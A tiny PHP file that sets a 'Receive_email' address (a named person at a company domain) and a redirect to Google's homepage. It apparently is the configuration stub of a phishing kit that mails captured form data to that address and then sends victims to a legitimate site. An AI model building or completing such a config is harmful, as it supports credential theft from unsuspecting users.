<?php 
$Receive_email="geanelle.manongdo@novellimo.com";
$redirect="https://www.google.com/";
?>